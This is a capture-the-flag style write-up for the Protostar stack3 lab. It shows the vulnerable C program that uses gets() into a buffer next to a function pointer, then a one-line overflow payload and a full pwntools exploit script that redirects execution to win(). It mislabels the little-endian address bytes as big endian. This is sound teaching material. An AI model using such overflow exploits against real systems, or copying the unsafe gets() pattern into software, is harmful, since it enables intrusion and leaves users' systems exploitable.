# Stack Three

Stack3 looks at environment variables, and how they can be set, and overwriting function pointers stored on the stack (as a prelude to overwriting the saved EIP)

**Hints**
- both gdb and objdump is your friend you determining where the win() function lies in memory.

This level is at /opt/protostar/bin/stack3

## Source Code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
```

## Writeup

In this code we have the buffer of 64 elements and a function pointer upper that.

We can overwrite the function pointer with the pointer of **win()** function to execute it.

To obtain the pointer of **win()** function, we can use **objdump**:

```bash
objdump -d /opt/protostar/bin/stack3
```

This is the **win()** function:

```
08048424 <win>:
 8048424:	55                   	push   %ebp
 8048425:	89 e5                	mov    %esp,%ebp
 8048427:	83 ec 18             	sub    $0x18,%esp
 804842a:	c7 04 24 40 85 04 08 	movl   $0x8048540,(%esp)
 8048431:	e8 2a ff ff ff       	call   8048360 <puts@plt>
 8048436:	c9                   	leave  
 8048437:	c3                   	ret  
```

The address in **big endian** will be:

```
\x24\x84\x04\x08
```

We can inject it with:

```bash
python -c "print('a' * 64 + '\x24\x84\x04\x08')" | /opt/protostar/bin/stack3
```

With this output:

```bash
$ python -c "print('a' * 64 + '\x24\x84\x04\x08')" | /opt/protostar/bin/stack3
calling function pointer, jumping to 0x08048424
code flow successfully changed
```

## Exploit

```python
#!/usr/bin/python3
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('stack3')

host = args.HOST or 'protostar'
port = int(args.PORT or 22)
user = args.USER or 'user'
password = args.PASSWORD or 'user'
remote_path = '/opt/protostar/bin/stack3'

# Connect to the remote SSH server
shell = None
if not args.LOCAL:
    shell = ssh(user, host, port, password)
    shell.set_working_directory(symlink=True)


def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def remote(argv=[], *a, **kw):
    '''Execute the target binary on the remote host'''
    if args.GDB:
        return gdb.debug([remote_path] + argv,
                         gdbscript=gdbscript,
                         ssh=shell,
                         *a,
                         **kw)
    else:
        return shell.run([remote_path] + argv, *a, **kw)


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
#gdbscript = '''
#break *0x{exe.symbols.main:x}
#continue
#'''.format(**locals())

io = start()
win_address = exe.symbols.win
payload = cyclic(64) + p32(win_address)
io.sendline(payload)
log.success(io.recv())
```